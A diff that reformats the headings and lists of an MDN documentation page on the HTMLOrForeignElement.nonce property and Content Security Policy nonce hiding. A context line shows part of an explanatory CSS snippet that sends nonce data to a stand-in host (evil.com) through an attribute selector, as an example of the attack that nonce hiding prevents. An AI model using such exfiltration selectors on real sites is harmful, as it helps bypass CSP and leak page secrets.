@@ -1,12 +1,10 @@
-HTMLOrForeignElement.nonce
-==========================
+# HTMLOrForeignElement.nonce
 
 The `nonce` property of the [`HTMLOrForeignElement`](../htmlorforeignelement) mixin returns the cryptographic number used once that is used by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.
 
 In later implementations, elements only expose their `nonce` attribute to scripts (and not to side-channels like CSS attribute selectors).
 
-Examples
---------
+## Examples
 
 ### Retrieving a nonce value
 
@@ -22,14 +20,12 @@ Nonce hiding helps preventing that attackers exfiltrate nonce data via mechanism
       background: url("https://evil.com/nonce?whatever");
     }
 
-Specifications
---------------
+## Specifications
 
 <table><thead><tr class="header"><th>Specification</th></tr></thead><tbody><tr class="odd"><td><a href="https://html.spec.whatwg.org/multipage/#attr-nonce">HTML Living Standard<br />
 <span class="small">The definition of 'nonce' in that specification.</span></a></td></tr></tbody></table>
 
-Browser compatibility
----------------------
+## Browser compatibility
 
 Desktop
 
@@ -89,11 +85,10 @@ The property is defined only for its useful elements: `<link>`, `<script>`, and 
 
 8.0
 
-See also
---------
+## See also
 
--   [`nonce` global attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce)
--   [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
--   CSP: [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
+- [`nonce` global attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce)
+- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- CSP: [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
 
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce" class="_attribution-link">https://developer.mozilla.org/en-US/docs/Web/API/HTMLOrForeignElement/nonce</a>
